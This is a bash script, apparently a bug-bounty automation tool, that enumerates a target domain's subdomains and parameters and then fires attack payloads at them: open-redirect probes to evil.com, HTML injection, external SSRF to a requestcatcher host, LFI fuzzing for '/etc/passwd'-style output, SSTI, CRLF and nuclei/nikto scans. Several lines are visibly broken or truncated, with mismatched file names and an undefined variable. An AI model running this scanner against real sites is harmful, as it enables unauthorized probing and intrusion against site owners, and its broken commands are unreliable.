#! /bin/bash 
target=$1

echo "
 _____ ____      _    __  __ _______        _____  ____  _  __
|  ___|  _ \    / \  |  \/  | ____\ \      / / _ \|  _ \| |/ /
| |_  | |_) |  / _ \ | |\/| |  _|  \ \ /\ / / | | | |_) | ' / 
|  _| |  _ <  / ___ \| |  | | |___  \ V  V /| |_| |  _ <| . \ 
|_|   |_| \_\/_/   \_\_|  |_|_____|  \_/\_/  \___/|_| \_\_|\_\
                                                                                                                            
"
echo "Script by @Himangshu"

if [ ! -d "$target" ]; then
      mkdir $target
fi
if [ ! -d "$target/recon" ]; then
      mkdir $target/recon
fi

if [ ! -d "$target/params-vuln" ]; then
          mkdir $target/params-vuln
fi

if [ ! -d "$target/subs-vuln" ]; then
          mkdir $target/subs-vuln
fi

if [ ! -d "$target/subs-vuln/false-positive" ]; then
          mkdir $target/subs-vuln/false-positive
fi

if [ ! -d "$target/params-vuln/false-positive" ]; then
          mkdir $target/params-vuln/false-positive
fi

if [ ! -d "$target/recon/false-positive" ]; then
          mkdir $target/recon/false-positive
fi

echo "[+]Lets Start With Recon...."
#---------------------------------------------------------------------------------
#-----------------------------Finding SubDomains----------------------------------
#----------------------------------------------------------------------------------
echo "[+]Enumurating SubDomains Using Amass..." 
#amass enum -d $target >> $target/recon/subs.txt

echo "[+]Enumurating SubDomains Using Assetfinder..." 
assetfinder $target >> $target/recon/subs.txt

echo "[+]Enumurating SubDomains Using SubFinder..."
subfinder -d $target --silent >> $target/recon/subs.txt

echo "[+]Enumurating SubDomains Using Findomain..." 
findomain -t $target -q >> $target/recon/subs.txt

echo "[+]Enumurating SubDomains Using Sublist3r..."
python3 /opt/Sublist3r/sublist3r.py -d $target -o $1/recon/sublist3r.txt
cat $1/recon/sublist3r.txt >> $target/recon/subs.txt
rm $1/recon/sublist3r.txt

echo "[+]Enumurating SubDomains Using Brute Forcing Technique..."
ffuf -u "https://FUZZ.$target" -w /opt/payloads/subs-brute.txt -v | grep "| URL |" | awk '{print $4} ' | sed 's/^http[s]:\/\///g' >> $target/recon/subs.txt

echo "[+]Enumurating SubDomains Using crt.sh...."
curl -s "https://crt.sh/?q=%25.$target&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u  >> $target/recon/subs.txt

echo "[+]Enumurating SubDomains Using threatcrowd...."
curl -s "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=$target" | jq -r '.subdomains[]' | sort -u >> $target/recon/subs.txt

echo "[+]Filtering Repeated Domains..." 
cat $target/recon/subs.txt | grep $target | sort -u | tee $target/recon/final-subs.txt 
rm $target/recon/subs.txt

echo "[+]Total Unique SubDomains" 
cat $target/recon/final-subs.txt | wc -l
#--------------------------------------------------------------------------------------------------
#-----------------------------------Filtering Live SubDomains--------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Removing Dead Domains Using httpx....." 
cat $target/recon/final-subs.txt  | httpx --silent  >> $target/recon/live-check.txt

echo "[+]Removing Dead Domains Using httprobe....." 
cat $target/recon/final-subs.txt  | httprobe >> $target/recon/live-check.txt
cat $target/recon/final-
#Subdomins With http://
cat $target/recon/live-check.txt | sort -u >> $target/recon/subdomins-with-http.txt

echo "[+]Analyzing Both httpx && httprobe...."
cat $target/recon/live-check.txt | sed 's/https\?:\/\///' | sort -u | tee $target/recon/live-subs.txt 
rm $target/recon/live-check.txt

echo "[+]Total Unique Live SubDomains...."
cat $target/recon/live-subs.txt | wc -l
#--------------------------------------------------------------------------------------------------
#-----------------------------------Enumurating Parameters-----------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Enumurating Params From Paramspider...." 
python3 /opt/ParamSpider/paramspider.py --level high -d $target -p khalid -o $1/recon/test-params.txt
echo "[+]Enumurating Params From Waybackurls...." 
cat $1/recon/live-subs.txt | waybackurls | grep = | qsreplace khalid | sort -u >> $1/recon/test-params.txt
echo "[+]Enumurating Params From gau Tool...." 
gau --subs  $target  | grep = | qsreplace khalid  >> $1/recon/test-params.txt
echo "[+]Enumurating Params From gauPlus Tool...." 
cat $target/recon/live-subs.txt | gauplus | grep = | qsreplace khalid  >> $1/recon/test-params.txt
echo "[+]Enumurating Params Using Katana Tool...."
cat $target/recon/subdomins-with-http.txt | katana -d 100 | grep = | qsreplace khalid  >> $1/recon/test-params.txt

echo "[+]Filtering Dups..." 
cat $1/recon/test-params.txt | sort -u >> tee $target/recon/final-params.txt 
rm $1/recon/test-params.txt 

echo "[+]Filtering Main Parameters With Uro by S0mDev...." 
cat $target/recon/final-params.txt | uro >> $target/recon/main-params.txt 

echo "[+]Total Unique Params Found...." 
cat $target/recon/final-params.txt | wc -l

echo "[+]Total Main Parameters Found...." 
cat $target/recon/final-params.txt | wc -l

#--------------------------------------------------------------------------------------------------
#-------------------------------Fuzzing For Open Redirects----------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Fuzzing For Openredirects...." 
cat $target/recon/final-params.txt | qsreplace 'https://evil.com' | while read host do ; do curl -s -L $host -I | grep "https://evil.com" && echo "$host" ; done >> $target/params-vuln/open-redirects.txt
#--------------------------------------------------------------------------------------------------
#-------------------------------Checking For HTMLi Injection---------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Fuzzing For HTML Injection...." 
cat $target/recon/final-params.txt | qsreplace '"><u>hyper</u>' | tee $target/recon/htmli-test.txt && cat $target/recon/htmli-test.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<u>hyper</u>" && echo "$host" ; done >> $target/params-vuln/htmli.txt
rm $target/recon/htmli-test.txt
#--------------------------------------------------------------------------------------------------
#-------------------------------Checking For XSS Injection-----------------------------------------
#--------------------------------------------------------------------------------------------------
#echo "[+]Testing For XSS Injection...." 
#dalfox file $url/htmli.txt -o $url/xss.txt
#--------------------------------------------------------------------------------------------------
#-------------------------------Checking For Command Injection-----------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Fuzzing For Command Injection...." 
#python3 /opt/commix/commix.py -m $target/recon/final-params.txt --batch 
#--------------------------------------------------------------------------------------------------
#-------------------------------Checking For CRLF Injection-----------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Fuzzing For CRLF Injection...." 
crlfuzz -l $target/recon/final-params.txt -o $target/params-vuln/crlf.txt -s 
#--------------------------------------------------------------------------------------------------
#-------------------------------Checking For SQL Injection-----------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Testing For SQL Injection...." 
#cat $target/recon/final-params.txt | python3 /opt/sqlmap/sqlmap.py --level 2 --risk 2 
#--------------------------------------------------------------------------------------------------
#-----------------------------------Checking For SSRF----------------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Fuzzing For External SSRF.........." 
cat $target/recon/final_params.txt | qsreplace "https://noor.requestcatcher.com/test" | tee $target/recon/ssrftest.txt && cat $target/recon/ssrftest.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "request caught" && echo "$host"; done >> $url/params-vuln/eSSRF.txt
rm $target/recon/ssrftest.txt
#--------------------------------------------------------------------------------------------------
#-------------------------------Checking For XXE Injection----------------------------------------
#--------------------------------------------------------------------------------------------------

#--------------------------------------------------------------------------------------------------
#-------------------------------Checking For Local File Inclusion----------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Scanning For Local File Inclusion...."
cat $target/recon/final-params.txt | qsreplace FUZZ | while read url ; do ffuf -u $url -v -mr "root:x" -w /opt/payloads/lfi-small.txt ; done >> $1/params-vuln/lfi.txt
#--------------------------------------------------------------------------------------------------
#-------------------------Checking For Server Side Template Injection-----------------------------
#--------------------------------------------------------------------------------------------------
cat $target/recon/final-params.txt | qsreplace FUZZ | while read url ; do ffuf -u $url -v -mr "noor49" -w /opt/payloads/ssti-payloads.txt ; done >> $1/params-vuln/ssti.txt
#--------------------------------------------------------------------------------------------------
#-------------------------Fuzzing Params With Nuclei ----------------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Fuzzing Params With Nuclei Fuzzing Templates..."
cat $target/recon/main-params.txt | nuclei -t /root/fuzzing-templates -rl 3 -c 2 >> $target/params-vuln/nuclei.txt
#--------------------------------------------------------------------------------------------------
#-------------------------------Scannning HTTP Parameter Smuggling---------------------------------
#--------------------------------------------------------------------------------------------------

#--------------------------------------------------------------------------------------------------
#-------------------------------Checking For SubDomain TakeOver------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Testing For SubTakeOver" 
subzy --targets  $url/recon/final_subs.txt  --hide_fails >> $target/subs-vuln/take-over.txt
#--------------------------------------------------------------------------------------------------
#-------------------------------------Full Scan With Nuclei----------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+] Full Scan With Nuclei......." 
cat $1/recon/live-subs.txt | nuclei -t /root/nuclei-templates/ -rl 3 -c 2 >> $1/subs-vuln/nuclei.txt
#--------------------------------------------------------------------------------------------------
#-------------------------------------Full Scan With Nikto----------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+] Full Scan With Nikto...." 
nikto -h $target/recon/live-subs.txt >> $target/subs-vuln/nikto.txt
#------------------------------------------------------------------------------------------------------------
#----------------------------------------------Checking For CORS---------------------------------------------
#------------------------------------------------------------------------------------------------------------
#echo "[+]Checking For CORS...." | lolcat
#cat $url/recon/live_subs.txt | while read host do ; do curl $host --silent --path-as-is --insecure -L -I -H Origin:beebom.com | grep "beebom.com" && echo "$host" ; done >> $url/subs_vuln/cors.txt
#------------------------------------------------------------------------------------------------------------
#--------------------------------------Checking For XSS through Referer Header-------------------------------
#------------------------------------------------------------------------------------------------------------
echo "[+]Checking For Xss in Referer Header...." 
cat $target/recon/live-subs.txt | while read host do ; do curl $host --silent --path-as-is --insecure -L -I -H Referer: https://beebom.com/ | grep "beebom.com" && echo "$host" ; done >> $url/subs-vuln/xss-refer.txt

figlet "Recon v2"

#------------------------------------------------------------------------------------------------------------
#--------------------------------------Taking LiveSubs ScreenShots-------------------------------------------
#------------------------------------------------------------------------------------------------------------
#echo "[+]Taking ScreenShots For Live Websites..." 
#python3 /opt/EyeWitness/Python/EyeWitness.py --web -f $url/recon/livesubs.txt --no-prompt -d $1/recon/EyeWitness --resolve --timeout 240
#------------------------------------------------------------------------------------------------------------
#--------------------------------------Scanning For Whois-------------------------------------------
#------------------------------------------------------------------------------------------------------------

#------------------------------------------------------------------------------------------------------------
#--------------------------------------Scanning For Headers--------------------------------------------------
#------------------------------------------------------------------------------------------------------------

#------------------------------------------------------------------------------------------------------------
#--------------------------------------Scanning For Emails & passwords-------------------------------------------
#------------------------------------------------------------------------------------------------------------

#------------------------------------------------------------------------------------------------------------
#--------------------------------------Scanning For WAF -------------------------------------------
#------------------------------------------------------------------------------------------------------------

#------------------------------------------------------------------------------------------------------------
#--------------------------------------Scanning For Built-in-with--------------------------------------------
#------------------------------------------------------------------------------------------------------------

#--------------------------------------------------------------------------------------------------
#-------------------------------Checking For Open Ports--------------------------------------------
#--------------------------------------------------------------------------------------------------

#echo "[+] Scanning for open ports..."
#nmap -iL $url/recon/live_subs.txt -T4 -oA $url/recon/openports.txt

#--------------------------------------------------------------------------------------------------
#-------------------------------------Fuzzing For GitHub Recon----------------------------------------
#--------------------------------------------------------------------------------------------------


#echo "[+] Fuzzing For GitHub Recon"
#echo "[+] Fuziing For Any Website Recon"
#scanning for Emails & passwords
#scanning for the whole root file where the system can be proceed
#scanning for WAF (web application firewall)
#scanning for Built-in-with
#checking for open ports
#scanning for whois
